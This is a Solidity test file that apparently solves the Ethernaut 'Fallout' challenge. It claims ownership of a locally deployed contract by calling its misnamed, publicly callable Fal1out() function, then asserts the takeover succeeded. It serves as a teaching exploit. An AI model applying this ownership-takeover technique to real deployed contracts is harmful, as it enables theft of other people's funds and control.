// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "../Fallout.sol";

contract FalloutTest is DSTest {
    Fallout fallout;
    function setUp() public {
        fallout = new Fallout();
    }

    function testClaimOwnership() public {
        console.log("Owner =",fallout.owner());
        console.log("Sender =", msg.sender);
        console.log("Contract Owner =", address(this));
        // (bool success, ) = address(fallout).call{value: msg.value}("Fal1out()");
        fallout.Fal1out();
        // require(success, "Failed");
        console.log("Owner =", fallout.owner());
        assert(fallout.owner() == address(this));
    }
}
